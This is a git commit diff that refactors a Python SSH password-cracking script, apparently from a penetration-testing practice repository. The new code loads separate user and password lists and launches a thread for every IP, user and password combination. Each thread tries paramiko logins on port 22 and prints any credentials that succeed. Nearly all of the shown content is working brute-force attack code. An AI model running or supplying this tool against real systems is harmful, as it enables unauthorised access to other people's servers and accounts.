21fa7899798eb5c4c559cfe08d25e093ede00b74
unknown <708863861@qq.com>
2018-06-24 23:07:37 +0800

    separate user & password

--- 0-PenetrationTesting/PasswordCracking/PasswordCracking.py
+++ 0-PenetrationTesting/PasswordCracking/PasswordCracking.py
@@ -13,36 +13,46 @@ def get_ip_list():
     return IP_LIST
 
 
-def get_account_list():
+def get_user_list():
     USER_LIST = []
-    f = open('dictionary.txt')
+    f = open('user.txt')
     for item in f.readlines():
-        item = item.strip('\n')
+        item = item.strip()
         if item and not item.startswith('#'):
-            arr = item.strip().split()
-            if len(arr) == 2:
-                USER_LIST.append((arr[0], arr[1]))
-        f.close()
+            USER_LIST.append(item)
+    f.close()
     return USER_LIST
 
 
+def get_password_list():
+    PASSWORD_LIST = []
+    f = open('dictionary.txt')
+    for item in f.readlines():
+        item = item.strip()
+        if item and not item.startswith('#'):
+            PASSWORD_LIST.append(item)
+    f.close()
+    return PASSWORD_LIST
+
 def scan_all():
     ip_list = get_ip_list()
-    for item in ip_list:
-        th = threading.Thread(target=cracking, args=(item,))
-        th.start()
+    for ip in ip_list:
+        user_list = get_user_list()
+        password_list = get_password_list()
+        for user in user_list:
+            for password in password_list:
+                th = threading.Thread(target=cracking, args=(ip,user,password))
+                th.start()
 
 
-def cracking(ip):
-    accounts = get_account_list()
-    for user, password in accounts:
-        try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(ip, 22, user, password, timeout=5)
-            print ("%s user is: %s, password is: %s" % (ip, user, password))
-        except Exception as e:
-            pass
+def cracking(ip,user,password):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, 22, user, password, timeout=5)
+        print ("%s user is: %s, password is: %s" % (ip, user, password))
+    except Exception as e:
+        pass
 
 
 if __name__ == '__main__':
